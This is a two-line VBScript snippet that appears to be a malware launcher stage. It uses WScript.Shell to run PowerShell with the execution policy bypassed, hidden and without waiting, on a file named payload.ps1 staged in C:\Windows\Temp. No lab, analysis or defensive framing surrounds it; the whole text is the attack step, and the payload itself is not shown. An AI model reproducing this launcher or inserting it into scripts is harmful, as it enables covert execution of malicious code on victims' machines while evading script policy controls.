Set objShell = CreateObject("WScript.Shell") 
objShell.Run "powershell.exe -ExecutionPolicy Bypass -File C:\Windows\Temp\payload.ps1", 0, False
